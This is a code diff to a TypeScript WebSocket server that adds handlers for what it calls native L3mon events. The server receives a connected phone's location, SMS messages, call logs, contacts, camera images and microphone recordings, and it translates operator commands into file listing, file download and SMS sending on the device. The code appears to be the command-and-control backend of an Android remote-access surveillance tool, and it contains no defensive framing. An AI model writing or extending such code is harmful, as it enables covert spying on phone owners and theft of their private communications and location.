@@ -151,6 +151,16 @@ export class WebSocketManager {
         }
       });
 
+      // Native L3mon Location
+      socket.on("0xLO", async (data: any) => {
+        const id = connectedDeviceId || data.deviceId;
+        if (id) {
+          await this.handleLocationUpdate({ ...data, deviceId: id });
+          this.io.to(`device:${id}`).emit("location-update", { ...data, deviceId: id });
+        }
+      });
+
+
       socket.on("device-sms", async (data: SMSMessage) => {
         const id = connectedDeviceId || data.deviceId;
         if (id) {
@@ -172,6 +182,18 @@ export class WebSocketManager {
           };
           await this.handleSMSMessage(sms);
           this.io.to(`device:${id}`).emit("sms-received", sms);
+        }
+      });
+
+      // Native L3mon SMS List Response
+      socket.on("0xSM", async (data: any) => {
+        const id = connectedDeviceId || data.deviceId;
+        if (id) {
+          if (typeof data === 'boolean' || data.success !== undefined) return; 
+          const smsList = data.list || data.sms || data.messages || [];
+          const { eventBus } = require("./eventBus");
+          eventBus.emit(`sms-response-${id}`, { deviceId: id, messages: smsList });
+          this.io.to(`device:${id}`).emit("sms-update", { messages: smsList, deviceId: id });
         }
       });
 
@@ -274,16 +296,17 @@ export class WebSocketManager {
         }
       });
 
-      // Legacy alias for L3MON call events
-      socket.on("calls", (data: any) => {
+      // Native L3mon call events
+      socket.on("0xCL", (data: any) => {
         const id = connectedDeviceId || data.deviceId;
         if (id) {
-          const callsArray = Array.isArray(data) ? data : (data.calls || []);
+          const callsArray = data.list || data.calls || (Array.isArray(data) ? data : []);
           const { eventBus } = require("./eventBus");
           eventBus.emit(`calls-response-${id}`, { deviceId: id, calls: callsArray });
           this.io.to(`device:${id}`).emit("calls-update", { calls: callsArray, deviceId: id });
         }
       });
+
 
       // [PLATINUM PHASE 3] Contacts handler (0xCO)
       socket.on("device-contacts", (data: { deviceId: number, contacts: any[] }) => {
@@ -296,16 +319,17 @@ export class WebSocketManager {
         }
       });
 
-      // Legacy alias for L3MON contact events
-      socket.on("contacts", (data: any) => {
+      // Native L3mon contact events
+      socket.on("0xCO", (data: any) => {
         const id = connectedDeviceId || data.deviceId;
         if (id) {
-          const contactsArray = Array.isArray(data) ? data : (data.contacts || []);
+          const contactsArray = data.list || data.contacts || (Array.isArray(data) ? data : []);
           const { eventBus } = require("./eventBus");
           eventBus.emit(`contacts-response-${id}`, { deviceId: id, contacts: contactsArray });
           this.io.to(`device:${id}`).emit("contacts-update", { contacts: contactsArray, deviceId: id });
         }
       });
+
 
       // [PLATINUM PHASE 3] Camera / Media file handler (0xCA)
       socket.on("device-camera", async (data: any) => {
@@ -352,6 +376,24 @@ export class WebSocketManager {
           socket.emit("device-camera", { deviceId: id, imageBase64: imgData });
         }
       });
+
+      // Native L3mon Camera
+      socket.on("0xCA", async (data: any) => {
+        const id = connectedDeviceId || data.deviceId;
+        if (id && (data.imageBase64 || data.image || data.buffer)) {
+           const imgData = data.imageBase64 || data.image || data.buffer;
+           socket.emit("device-camera", { deviceId: id, imageBase64: imgData });
+        }
+      });
+
+      // Native L3mon Microphone
+      socket.on("0xMI", async (data: any) => {
+        const id = connectedDeviceId || data.deviceId;
+        if (id && data.buffer) {
+           await this.handleBinaryData(socket, "audio", { buffer: data.buffer, name: data.name || "recording.mp3" });
+        }
+      });
+
 
       // [PLATINUM PHASE 3] File upload FROM device handler
       socket.on("device-file-upload", async (data: { deviceId: number, path: string, content: string }) => {
@@ -622,11 +664,24 @@ export class WebSocketManager {
       return;
     }
 
+    let finalAction = mappedAction;
+    let finalPayload: any = { ...data.details, ...data.payload };
+    
+    // Convert L3mon specific actions
+    if (action === "get-sms") {
+        finalAction = "ls";
+    } else if (action === "send-sms") {
+        finalAction = "sendSMS";
+    } else if (action === "request-files") {
+        finalAction = "ls";
+    } else if (action === "download-file") {
+        finalAction = "dl";
+    }
+
     const payload = {
-      action: mappedAction, // Legacy L3MON action name
-      type: mappedAction,   // Some branches use type
-      details: data.details || data.payload || {},
-      payload: data.payload || data.details || {},
+      action: finalAction,
+      type: mappedAction, // This must always be the 0x code (e.g. 0xSM)
+      ...finalPayload,
       deviceId: deviceId,
       timestamp: Date.now()
     };
